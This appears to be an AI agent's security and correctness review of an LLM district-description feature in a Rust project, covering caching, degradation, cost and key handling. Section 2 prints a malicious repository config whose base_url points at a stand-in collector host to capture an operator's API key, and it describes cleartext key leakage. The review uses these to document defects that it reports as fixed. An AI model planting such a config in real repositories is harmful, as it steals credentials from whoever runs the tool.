# LLM-written district descriptions — independent review

Reviewer: a second agent, working only in `polis-repo`. Nothing here was taken
from the implementer's report; every number below was produced by running the
code, mostly through the shipped `describe_llm` binary against real
repositories in `C:/coding` and against purpose-built repositories in a
scratchpad.

**Verdict: green — after two key-safety defects that I found and fixed.**

The caching design is correct and the central promise holds under direct test:
I rewrote every line of every file in a 35-file repository, committed it, and
the planner asked for **zero** regenerations. Degradation is genuinely total —
eight adversarial failure modes, every one of them exits 0 with the derived
descriptions intact. The layout cannot see a description at all.

But the module shipped with a gap in exactly the area it is most careful
about. Its own doc-comment lists the seven places a key must never reach —
files, logs, error messages, fixtures, commits, argument lists, images — and
every one of those is genuinely closed. The list omits *the network itself*,
and two configurations walked a key straight out through that hole. Both are
now fixed and pinned by tests. Details in §2.

> **The live call is unverified.** Neither `ZAI_API_KEY` nor `GLM_API_KEY` was
> set in this environment and I did not ask for one. Everything below was
> verified against local endpoints I control. No request was made to Z.ai. In
> particular, whether Z.ai honours `response_format: {"type":"json_object"}` is
> **untested** — see §7.

---

## 1. Build gates

Measured when I completed the work, before another agent's concurrent changes
landed (see the note below):

| Gate | Result |
|---|---|
| `cargo fmt --all -- --check` | clean (exit 0) |
| `cargo clippy --workspace --all-targets` | **0 warnings** |
| `cargo test --workspace` | **1076 passed, 0 failed, 10 ignored** |
| `cargo tree -p polis-hook` | `polis-hook v0.1.0` — **one line** |
| `Cargo.toml` / `Cargo.lock` | **byte-identical to `HEAD`** |

1071 of those tests were the implementer's; the 5 additional ones are mine,
covering the fixes in §2. The zero-dependency claim is real and I checked it
the only way that means anything: `git diff --stat Cargo.lock
polis-repo/Cargo.toml` is empty. Nothing new can reach `polis-hook` because
nothing new was added to the workspace at all.

### The workspace gate is currently red, and not because of this work

While I was reviewing, another agent landed work in `polis-app`,
`polis-render` and `polis-world`, including two **untracked, in-progress test
files** that do not compile against today's API:

- `polis-world/tests/placement_census.rs` — `OpPlacement`, `op_position`,
  `Health::ops_placed` do not exist yet.
- `polis-render/tests/replay_measure.rs` — `polis_render::frame::pace` does not
  exist yet.

Those break `cargo test --workspace` and `cargo fmt --all -- --check`. They are
that agent's files, mid-flight; I did not touch them and I deliberately did
**not** re-run `cargo fmt --all` after they appeared, because doing so would
have reformatted someone else's work in progress.

Scoped to the crate I own, and to everything that still compiles:

| Gate | Result |
|---|---|
| `cargo fmt -p polis-repo -- --check` | clean (exit 0) |
| `cargo clippy -p polis-repo --all-targets` | **0 warnings** |
| `cargo test -p polis-repo` | **313 passed, 0 failed** |
| `cargo test --workspace --exclude polis-world --exclude polis-render` | **910 passed, 0 failed** |
| `cargo test -p polis-render --lib` / `-p polis-world --lib` | 68 / 71 passed, 0 failed |
| `polis-layout` golden snapshots | green, unmodified |

Nothing in this review's changes is implicated in the red gate.

The HTTP choice is defensible. `http://` is HTTP/1.1 written onto a
`TcpStream`; `https://` shells out to `curl`, which ships in Windows 10 1803+,
macOS and effectively every Linux image. Both sit behind one `Transport` trait,
so a `ureq`-backed implementation is a new type in a caller's crate. Given that
the alternative is ~40 crates including a C-built crypto library and a baked-in
CA set that ages, this is the right trade for a feature that must degrade
cleanly when it cannot reach the network anyway.

---

## 2. Key safety — two defects found, both fixed

### What was already right

This part was done carefully and I want to be specific about it, because the
fixes below are not a verdict on the whole design.

- `Secret` has no `Serialize`, no `Display`, no `from_str`. `Debug` prints
  `Secret(<redacted>)`. It is constructible **only** from the environment.
- `expose()` has exactly two call sites in the workspace: `scrub()` and the
  header renderer. `HeaderValue::render()` is private with two call sites, both
  writing to the wire.
- `curl` receives the key on **stdin** as a `--config -` line, never in `argv`
  where any process on the machine could read it. The request body — which
  carries no credential — goes to a temp file in the state directory that is
  deleted on return. I confirmed no `req-*` files survive a run.
- `curl`'s stderr is passed through `scrub()` before it can reach an error, so
  the classic "the debug error included the request headers" bug is closed.
- `LlmConfig` carries key *names*, never values, and uses
  `deny_unknown_fields`, so a stray `"api_key"` in `llm.json` is a hard parse
  error rather than a silently stored secret.
- Grepping every tracked file for key-shaped strings returns only synthetic
  detector vectors (`AKIAIOSFODNN7EXAMPLE` is AWS's own published example).
  After all my testing, the state directory contained no credential material.

### Defect 1 — a key was sent in cleartext to any `http://` host

`PlainHttpTransport` renders a `HeaderValue::Secret` into the request head for
**any** `http://` URL. Plain HTTP exists to support a local Ollama, and a local
Ollama is on loopback — but nothing checked that. I confirmed it end to end:
pointing an `openai-compatible` provider at `http://<host>/v1` with a key in the
environment put

```
Authorization: Bearer <the key>
```

on the wire in the clear, where every hop between could read it.

### Defect 2 — the repository chose where the key went

This is the more serious one, and TLS does not help.
`LlmConfig::for_repo()` reads **`<repo>/.polis/llm.json` — a file inside the
repository being scanned**, which arrives with a clone and which almost nobody
opens. It can set both `base_url` and `key_env`. So a repository containing:

```json
{ "enabled": true, "provider": "glm",
  "base_url": "https://collector.example/v1",
  "key_env": ["ZAI_API_KEY", "GLM_API_KEY"] }
```

would, on `describe --generate`, POST the operator's real key to a stranger's
server over TLS, with no error and no prompt. I built that repository and
reproduced it.

### The fix

One invariant, enforced at the single point where a key is picked up
(`LlmRunner::with_transport`): **a key is attached only when the endpoint is one
the operator chose, over a channel that protects it.**

`LlmConfig::key_destination()` refuses in two cases:

1. **Cleartext** — scheme is `http` and the host is not loopback.
   `localhost`, `127.0.0.1` and `[::1]` all still work, so Ollama is unaffected.
2. **Repo redirect** — the config came from a checkout (`ConfigOrigin::Repository`,
   set by `LlmConfig::load`) and names a host that is neither the provider's own
   default nor loopback.

A refusal drops the key to `None` — the state the feature already degrades
through cleanly — and reports itself through the existing `blocked()` channel,
so it is **visible, never silent**, matching the module's own staleness
principle. The run makes zero calls rather than proceeding keyless: sending the
district listing to a collector is not a consolation prize.

`origin` is `#[serde(skip)]`, so a repository cannot promote itself by writing
`"origin": "operator"` — and because the container is `deny_unknown_fields`,
a file that tries is rejected outright. An operator who types `--base-url`,
`--key-env` or `--provider` has chosen the host themselves, and
`chosen_by_operator()` lifts the guard.

Verified through the shipped binary:

```
! the API key was withheld: collector.example would receive it over http://,
  in the clear. Use https://, or a loopback address for a local model.
      → 0 calls, 0 bytes reached the collector

! the API key was withheld: this repository's .polis/llm.json points at
  collector.example, which is not the provider's own api.z.ai. A repository
  does not get to choose where your key goes — pass --base-url yourself if
  you meant it.
      → 0 calls
```

Both messages name a host and never a credential. Five new tests pin this:
cleartext refusal with all three loopback spellings allowed, repo redirect,
`serde(skip)` non-promotability, and two runner-level tests asserting
`call_count() == 0` and that the key never appears in the report.

**Files changed:** `polis-repo/src/llm.rs`, `polis-repo/src/llm/run.rs`,
`polis-repo/src/llm/run_tests.rs`, `polis-repo/examples/describe_llm.rs`.

---

## 3. Degradation — eight modes, all survive

Driven through the release binary against local endpoints I controlled. In
every case the process exits **0**, the derived descriptions survive, the error
is bounded, and no key appears in any message.

| Failure mode | Behaviour | Calls | Exit |
|---|---|---:|---:|
| No key, real GLM endpoint | `! no API key: set ZAI_API_KEY or GLM_API_KEY` | 0 | 0 |
| Empty-string key | identical — a blank variable is not a key | 0 | 0 |
| HTTP 500 | `[http-status]`, 2 retries, derived kept | 3 | 0 |
| HTTP 401 | `[http-status]`, **0 retries** — correctly not retried | 1 | 0 |
| HTTP 502 + HTML body | `[http-status]`, body bounded | 3 | 0 |
| Malformed JSON | `[malformed]`, 2 retries | 3 | 0 |
| Empty body | `[malformed]` | 3 | 0 |
| Closed port | `[transport] unreachable` | 3 | 0 |
| Hang past timeout | `[transport] timed out`, **4 s** total at `timeout_secs=2` | 2 | 0 |
| Key withheld (§2) | run blocked before any socket opens | 0 | 0 |

No panic, no hang, no failed render anywhere. The 401-is-not-retried
distinction is a nice touch: a bad key will not become a good one, and retrying
it would waste the operator's money.

---

## 4. The cache contract

This is the part the operator personally pushed on, so I tested it directly
rather than trusting the unit tests.

### Content edits do not regenerate — confirmed

In a 35-file scratchpad repository, I rewrote **every line of every file** and
committed it (`35 files changed, 1435 insertions(+), 35 deletions(-)`), then
re-planned:

```
dry-run: 0 district(s) to describe in 0 call(s); 4 fresh, 0 stale;
         ~0 in / ~0 out tokens, ~$0.0000
```

Zero regenerations, zero calls, zero dollars. The central promise holds.

> One trap for anyone repeating this: re-plan with the **same** provider and
> model. My first attempt reported `STALE recipe 0‰` because I generated with
> `--provider ollama` and re-planned with the default GLM config. That is
> correct behaviour — a different model is a different recipe — and note the
> drift itself was `0‰`, exactly as designed.

### Drift threshold — trips exactly where it claims

Walking `src/data` (8 files) one added file at a time, against the shipped
440 ‰:

| Files added | Union | Jaccard distance | Reported |
|---:|---:|---:|---|
| 4 | 12 | 333 ‰ | fresh |
| 5 | 13 | 385 ‰ | fresh |
| 6 | 14 | 429 ‰ | **fresh** |
| 7 | 15 | 467 ‰ | **`STALE names 467‰`** |

The reported permille matched my independent calculation exactly at every step.
The threshold is real, the metric is genuine Jaccard distance, and it is
symmetric in additions and removals.

I also reproduced the measurement behind the choice (`examples/llm_drift.rs`)
across five real repositories at 30/90/365-day windows:

| Window | Surviving districts | ≥250 ‰ | ≥330 ‰ | **≥440 ‰** | ≥500 ‰ |
|---:|---:|---:|---:|---:|---:|
| 30d | 91 | 14 % | 9 % | **4 %** | 3 % |
| 90d | 87 | 21 % | 13 % | **9 %** | 6 % |

440 ‰ keeps regeneration rare, which is the design goal. The reasoning in
`cache.rs` for preferring it over 330 is sound: replacing a third of *n* names
gives 500 ‰, adding a third gives 250 ‰, so "roughly a third changed" is a band
and the measurement picks the point inside it. Caveat in §8.

### Splits and merges — orphans handled, children inherit nothing

Growing `src/services` until it split into `src/services/auth` and
`src/services/billing`:

```
| src/services         | 10 | drifted        | STALE split 0‰ | *model* … |
| src/services/auth    |  9 | no-description | —              | *—*       |
| src/services/billing |  9 | no-description | —              | *—*       |
```

Exactly right. The parent is flagged `split` (its own names did not move — `0‰`
— so a names-only fingerprint would have missed this entirely; the entry stores
its child district paths, which is what catches it). The two new districts are
`Missing` and **do not inherit the parent's now-wrong text**.

### The cache lives outside the repository — confirmed

`%LOCALAPPDATA%\polis\llm\<fnv1a64 of the normalised root>.json`. After
generating against three scratchpad repositories, none of them contained a
`.polis` directory or any new file — `git status --porcelain` was empty. No
feedback loop, and nothing for the repo walk to ingest (ADR-0065).

The cache stores **hashes** of file names, not the names themselves, so the
cache file does not disclose repository contents either. It contains no key.

---

## 5. Staleness is visible, never silent

A drifted-but-not-regenerated description renders as
`STALE names 467‰` / `STALE split 0‰` / `STALE recipe 0‰` — cause **and**
magnitude — while still showing the old text. `Freshness` is a three-state enum
(`Missing` / `Fresh` / `Stale(Drift)`), so there is no representation in which
stale text can be reported as fresh: the renderer gets a distinct state to draw
differently, which is what the brief asked for. I never observed old text
presented as current.

---

## 6. No implicit spend

- **Nothing outside `polis-repo` references `polis_repo::llm` at all.** The
  only `LlmRunner` construction in the workspace is the example CLI. A render
  or a snapshot cannot spend money because the code path does not exist yet.
- The read path, `apply_cached_model_descriptions`, reads one JSON file and
  returns. It touches no `Transport` and opens no socket.
- The CLI's default with no mode flag is a dry run that prices the work and
  calls nothing; a cold start additionally requires `--yes`.
- `enabled` defaults to `false`.

A user cannot discover a bill.

---

## 7. What actually goes out, and what it really costs

I captured the exact bytes for 16 real requests across several repositories by
pointing the shipped binary at a local endpoint that logged them.

The payload is a JSON chat-completions body whose user message contains only
these line kinds: `PATH`, `MAP LABEL`, `KIND`, `FILES`, `SUB-DISTRICTS`,
`MOST IMPORTED`, `FILE NAMES`, `DOC`. I asserted this programmatically across
all 16 payloads together with a search for code-shaped constructs
(`function …(`, `=> {`, `class … {`, `import … from`, `def …(`, `#include`,
`fn …() ->`):

```
payloads inspected: 16
RESULT: no source-code bodies and no unexpected line kinds in any captured payload.
```

**No source code bodies leave the machine.** That is structural — the prompt
builder has nowhere to put one — not a filter that could regress.

The outbound redactor does real work on real repositories: on `qurio-toolset`
it dropped **22 credential-shaped file names** while still sending the rest of
each district.

### The cost the operator was quoted was too high, in the safe direction

Measured on `qurio-toolset`, the largest repository tested — 41 districts in
6 batched calls:

| Measure | Value |
|---|---|
| Actual prompt bytes on the wire | 49,282 |
| Implied input tokens (chars/4) | ~12,320 |
| Planner's own estimate | 11,878 (within 4 %) |
| Output tokens | ~3,690 |
| **Real cost, promo pricing** | **$0.0018** |
| Real cost, list pricing (after 2026-09-09) | $0.0037 |

| Repository | Districts | Est. cost (promo) |
|---|---:|---:|
| qurio-toolset | 41 | $0.0018 |
| stickingplacebooks | 26 | $0.0013 |
| Squigglo | 21 | $0.0008 |
| vc-tower | 6 | $0.0003 |
| agentolis | 3 | $0.0001 |

**The $0.006/repo figure was about 3× too high**, because it assumed ~1000
input tokens *per district*; batching amortises the ~2000-character system
prompt across ~7 districts per call. Even at full list price after the
promotion ends, the worst repository measured is $0.0037. The estimate erred
conservatively, which is the right direction, but the operator should know the
real number is lower.

### Structured output: sent, but unverified

`response_format: {"type":"json_object"}` **is** present in the outbound body —
I read it in the capture. Whether **Z.ai honours it is untested**, because no
key was available. The implementation does not depend on the answer: there is a
`request_json_object` toggle to turn the field off, and `parse_reply` is
tolerant — it recovers JSON from a fenced block, from a preamble, or from a
bare array, and treats prose-with-no-JSON as `Unusable` rather than panicking.
Both behaviours are covered by passing tests. So the fallback the brief asked
for is implemented; the empirical question is simply still open.

---

## 8. Determinism

Descriptions cannot feed layout, and this is structural rather than a
convention: `polis-layout` depends on `polis-repo` but **never reads
`description` or `label()`** — grepping its entire source for either returns
nothing. The only mutation path, `set_model_description`, sets two fields on an
existing entry by index; it cannot reorder, add or remove a district.

Empirically, the district structure — path, file count, ordering, which is what
the layout consumes — is byte-identical with the cache present and with it
deleted:

```
=== DIFF OF LAYOUT STRUCTURE ===
IDENTICAL — structure is byte-identical with and without the cache
```

The `tests/golden/*.snap` layout snapshots are untouched and green.

---

## 9. Honesty of the metric

`DescriptionSource::Model` is deliberately **not** prose: `is_prose()` matches
only `Readme | Manifest | DocComment`, and `NeighborhoodStats::described_model`
is a separate counter from `described_prose`. The review's honest 14 % "how
well does this repository document itself" number therefore cannot be inflated
by sentences the operator paid for. I verified both.

---

## 10. Residual risks and smaller findings

Nothing here blocks the verdict.

1. **A repository can still redirect the non-key payload.** The §2 fix protects
   the *key*. A keyless provider (Ollama, or any config with empty `key_env`)
   configured by a checked-in `.polis/llm.json` can still send the district
   listing — file names — to an arbitrary host. The dry run does print the
   endpoint, so it is visible, and blocking it would break legitimate
   self-hosted setups, so I did not change it unilaterally. Worth an explicit
   decision.
2. **File names include dotfiles.** `.env`, `.env.local` and
   `.claude/settings.local.json` appear in `FILE NAMES`. Only names, never
   contents, and the operator agreed to send names — but it does disclose to
   the provider that those files exist.
3. **`"provider"` in `llm.json` does not move the price.** Only
   `with_provider()` moves `base_url`, `model`, `key_env` and `price` together.
   A file setting `"provider": "ollama"` keeps GLM's prices, so a local run
   reports a non-zero dollar estimate. Cosmetic, but the accounting exists
   precisely so the operator need not trust an estimate.
4. **The drift evidence base is thin.** Of the five repositories measured, only
   `qurio-toolset` changes enough to produce signal; the rest contribute zeros.
   440 ‰ is defensible and conservative, but it rests on one active repository.
5. **The `curl`/TLS path is not exercised end to end.** With no key and no
   reachable HTTPS endpoint, only `PlainHttpTransport` was driven against a real
   socket. The argv construction, stdin config handling and stderr scrubbing
   were reviewed by reading, and unit tests drive `CurlTransport` against a
   stand-in binary, but the real thing is untested here.
6. **A pre-existing flaky test was fixed in an uncommitted working-tree change**
   (`provider.rs`): `std::env::set_var` on one shared variable name raced under
   the parallel harness. The fix parameterises the name. It is correct and I
   left it in place.
7. **The workspace build is red from another agent's in-flight test files**
   (§1). Not caused by this work, and not mine to fix, but it needs to be green
   before any of this ships.
8. **Unrelated observation.** `%LOCALAPPDATA%\polis\history\*.json` contains a
   string matching a key pattern (`sk-highimpact-…`). It is not produced by
   this feature, it is not in any tracked file, and it reads as a synthetic
   fixture rather than a credential — but the history store is capturing
   session text into a file on disk, which is worth a look under its own
   feature.

---

## 11. Recommendation

**Ship it.** The caching design is the good part and it does what the operator
was promised: editing files is free, meaning-moves cost a call, staleness is a
visible state rather than a silent lie, and the fast-changing half (relations)
never triggers the slow half. Degradation is total. Cost is a third of the
quote.

The two key-safety defects were the kind that only appear when you ask "where
can this credential physically go?" rather than "did we remember to redact it?"
— the module answered the second question thoroughly and had not been asked the
first. Both are closed and pinned.

Before wiring `polis describe` into `polis-app`, settle residual risk 1, and
run one live call against Z.ai to answer the `response_format` question in §7.
